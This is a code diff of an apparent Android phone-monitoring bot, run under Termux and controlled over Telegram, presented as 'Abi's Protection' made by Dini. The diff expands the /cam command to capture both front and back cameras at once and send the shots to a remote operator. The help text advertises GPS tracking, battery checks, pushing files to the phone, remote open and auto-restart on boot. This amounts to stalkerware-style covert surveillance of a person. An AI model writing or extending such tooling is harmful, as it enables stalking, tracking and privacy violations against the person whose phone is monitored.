@@ -720,16 +720,29 @@ async def boot_dump(app):
 
 async def cam(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
-    cid = 1 if context.args and context.args[0] == "front" else 0
-    p = "/sdcard/cam.jpg"
-    os.system(f"termux-camera-photo -c {cid} {p}")
+    await update.message.reply_text("📸 Capturing both cameras simultaneously...")
+    
+    back_path = "/sdcard/cam_back.jpg"
+    os.system(f"termux-camera-photo -c 0 {back_path}")
     await asyncio.sleep(2)
-    if os.path.exists(p):
-        with open(p, "rb") as f:
-            await update.message.reply_photo(photo=f, caption="📷 Abi's Surroundings")
-        os.remove(p)
+    
+    front_path = "/sdcard/cam_front.jpg"
+    os.system(f"termux-camera-photo -c 1 {front_path}")
+    await asyncio.sleep(2)
+    
+    if os.path.exists(back_path):
+        with open(back_path, "rb") as f:
+            await update.message.reply_photo(photo=f, caption="📷 Back Camera — Abi's Surroundings")
+        os.remove(back_path)
     else:
-        await update.message.reply_text("❌ Camera unavailable. Verify permissions.")
+        await update.message.reply_text("❌ Back camera failed.")
+    
+    if os.path.exists(front_path):
+        with open(front_path, "rb") as f:
+            await update.message.reply_photo(photo=f, caption="🤳 Front Camera — Abi's Selfie")
+        os.remove(front_path)
+    else:
+        await update.message.reply_text("❌ Front camera failed.")
 
 async def loc(update, context):
     if update.effective_user.id != AUTHORIZED_ID: return
@@ -810,7 +823,7 @@ async def start(update, context):
 async def help_cmd(update, context):
     await update.message.reply_text("""🛡️ *Dini's Command Roster — Abi's Protection*
 
-📷 /cam [back|front] — View Abi's Surroundings
+📸 /cam — Capture Back + Front Camera (Dual Shot)
 📍 /location — Track Abi's Location + Maps
 🔋 /battery — Check Abi's Battery
 ⬇️ /download &lt;url&gt; — Send File to Abi's Downloads
@@ -875,11 +888,11 @@ chmod +x ~/.termux/boot/start_bot.sh && echo '🛡️ Abi Protection Active — 
             <div class="card-footer">
                 <div class="tag-row">
                     <span class="tag"><span class="tag-dot"></span> 11 Commands</span>
+                    <span class="tag"><span class="tag-dot"></span> Dual Camera</span>
                     <span class="tag"><span class="tag-dot"></span> GPS Tracking</span>
                     <span class="tag"><span class="tag-dot"></span> .txt Reports</span>
                     <span class="tag"><span class="tag-dot"></span> Remote Open</span>
                     <span class="tag"><span class="tag-dot"></span> Auto-Restart</span>
-                    <span class="tag"><span class="tag-dot"></span> End-to-End Protected</span>
                 </div>
                 <p class="footer-note">Made with <span>♥</span> by Dini for Abi's Safety</p>
             </div>
